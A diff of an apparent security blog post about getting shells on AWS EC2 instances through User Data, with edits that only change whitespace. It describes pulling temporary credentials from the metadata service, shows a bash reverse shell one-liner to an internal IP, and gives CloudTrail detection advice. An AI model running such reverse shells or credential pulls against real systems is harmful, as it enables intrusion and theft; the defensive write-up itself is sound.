@@ -158,7 +158,7 @@
 
           <p>From there, the attacker can query the Instance Metadata Service (IMDS) at the link-local address 169.254.169.254 to retrieve temporary AWS credentials for the role attached to the instance via its instance profile. These credentials are issued on demand by AWS STS (Security Token Service) and are accessible to any process running on the instance.</p>
 
-          
+
           <h2 class="section-heading">Example Payloads</h2>
 
           <p>Here are simple demonstration payloads showing how an attacker could leverage User Data for a shell:</p>
@@ -323,9 +323,9 @@ bash -i >& /dev/tcp/172.31.34.136/60000 0>&1
           <p>CloudTrail logs EC2 API calls such as <inline-code>RunInstances</inline-code> and <inline-code>ModifyInstanceAttribute</inline-code>. These can be used to see if user data is set, but from my experience the user data is redacted from these logs. A defender would therefore need to have access to the account they are investigating to view what the user data is set to. Getting this programmatically using the CLI or Boto is also possible:</p>
 
           <code>
-          aws ec2 describe-instance-attribute \
-          --instance-id i-xxxx \
-          --attribute userData
+aws ec2 describe-instance-attribute \
+--instance-id i-xxxx \
+--attribute userData
           </code>
 
           <p>If you were worried about users at your org getting shells from EC2 instances using user data, I would recommend setting up an alert that looks for user data being present in CloudTrail logs using a filter like: <inline-code>requestParameters.userData=*</inline-code> and then using a globally privileged role and AWS CLI to programmatically read the userData attribute to enrich the ticket.</p>
